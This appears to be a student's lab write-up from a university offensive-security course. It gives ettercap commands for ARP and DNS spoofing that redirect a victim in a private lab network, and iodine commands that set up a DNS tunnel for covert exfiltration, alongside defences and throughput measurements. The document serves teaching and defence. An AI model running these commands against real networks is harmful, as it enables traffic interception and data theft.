# Network Security — MITM, DNS Spoofing & Covert Channels

**TL;DR:** Executed ARP spoofing + DNS spoofing using Ettercap to redirect victim traffic to an attacker-controlled server; built and measured a DNS-based covert channel using iodine that tunnelled data through DNS queries at 0.8–1.5 Mbits/sec while evading firewall detection.

## Context

This lab covered two core network attack classes: active interception (MITM via ARP/DNS spoofing) and covert exfiltration (tunnelling data through DNS). Both are real-world techniques used in APT campaigns and post-exploitation exfiltration.

Course: Offensive Technologies, University of Amsterdam (OS3)

## Part 1 — MITM: ARP Spoofing + DNS Spoofing

### Setup

```
Attacker (Kali Linux): 192.168.50.11
Victim:                192.168.50.40
Attacker server:       192.168.50.50
Legitimate server:     145.100.96.70
```

### Attack

Used `ettercap` to poison ARP caches and intercept all traffic between victim and router, then DNS-spoofed `os3.nl` to redirect to the attacker-controlled server:

```bash
sudo ettercap -T -q -i eth0 \
  -M arp:remote /192.168.50.11// /192.168.50.40// \
  -P dnsspoof
```

### Result

```
# Before attack
traceroute os3.nl → 145.100.96.70 (legitimate server)

# After attack
traceroute os3.nl → 192.168.50.50 (attacker server)

dns_spoof: A [os3.nl] spoofed to [192.168.50.50] TTL [3600 s]
```

Victim successfully redirected to attacker-controlled server. Full MITM established.

### Defences

- **DNSSEC** — cryptographic signatures on DNS records prevent spoofed replies from validating; attacker-crafted responses are rejected by validating resolvers
- **Dynamic ARP Inspection** — validates ARP packets against a DHCP snooping binding table
- **HTTPS + HSTS** — even with DNS redirected, TLS certificate mismatch alerts the user; HSTS prevents downgrade

---

## Part 2 — DNS Covert Channel (iodine)

### Setup

DNS tunnelling encodes arbitrary data inside DNS queries and responses — DNS traffic is almost universally allowed through firewalls and is rarely monitored for payload content.

```bash
# Server (System A)
sudo iodined -f -c -P secretpass 10.0.0.1 tunnel.lab

# Client (System C)
sudo iodine -f -P secretpass 192.168.50.50 tunnel.lab
```

### Throughput Measurement

| Channel | Throughput |
|---|---|
| Baseline (iperf, no tunnel) | ~26–27 Gbits/sec |
| DNS covert channel (iodine) | 0.8–1.5 Mbits/sec |

The covert channel drops throughput by ~99% compared to baseline — but that tradeoff is the point. DNS traffic blends into normal network noise; the low bandwidth is acceptable for data exfiltration where stealth matters more than speed.

### Can covert channels be prevented?

Not fully. DNS and ICMP are valid protocols essential for normal network operation — blocking them breaks things. What can be done:

- Monitor DNS for anomalous query volumes, unusual subdomain patterns, and high-entropy labels
- Route all DNS traffic through an internal resolver — prevents clients from sending DNS directly to external attacker-controlled servers
- Inspect DNS payload sizes — legitimate queries are small; tunnelled data inflates query/response size significantly

## Tools & Technologies

`Ettercap` `iodine` `iperf3` `Wireshark` `Kali Linux` `ARP spoofing` `DNS spoofing`

---

**Ritika Nayak** — MSc Security & Network Engineering, University of Amsterdam (OS3)
*Group project, Offensive Technologies course*
